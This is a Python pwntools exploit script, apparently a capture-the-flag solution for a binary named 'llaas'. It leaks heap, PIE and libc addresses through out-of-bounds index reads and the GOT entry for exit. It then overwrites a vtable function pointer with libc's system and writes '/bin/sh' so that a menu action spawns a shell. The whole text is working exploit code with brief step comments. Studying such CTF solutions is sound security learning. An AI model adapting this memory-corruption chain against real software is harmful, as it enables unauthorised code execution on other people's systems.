#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()

exe = "./llaas"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)
if args.GDB: gdb.attach(io, """
	b *main
""")

def menu(idx: int):
	io.sendlineafter(b">> ", encode(idx))

def insert(idx, data):
	menu(2)
	io.sendlineafter(b": ", encode(data))
	io.sendlineafter(b": ", encode(idx))

def print_index(idx):
	menu(4)
	io.sendlineafter(b": ", encode(idx))
	return int(io.recvline()[:-1])

leak = print_index(0x1E)
info("heap leak @ %#x" % leak)

"""
An ELF address is at LEAK+0x10

We will write that address to an index in our
vector and then dereference that to leak an ELF address:
"""
insert(0x0, leak+0x10)

pie_leak = print_index(0x0)
info("pie leak @ %#x" % pie_leak)

elf.address = pie_leak - 0x329E
info("elf @ %#x" % elf.address)

"""
Now, writing the address of GOT.exit to a location
So when dereferenced; gives us a libc leak.
"""

insert(0x0, elf.got.exit)
got_leak = print_index(0x0)
info("got.exit @ %#x" % got_leak)

libc.address = got_leak - libc.sym.exit
info("libc @ %#x" % libc.address)

"""
Overwrite an entry of the vtable with that
of libc.system so that we can later invoke
/bin/sh with that.
I overwrite print_list with system
"""
insert(0x2E, libc.sym.system)

"""
Now, we need to overwrite the address of *list
with /bin/sh in hex.
"""
insert(-6, 0x0068732f6e69622f)

"""
Invoke print_list, it will invoke system("/bin/sh")
"""
menu(3)


io.interactive()
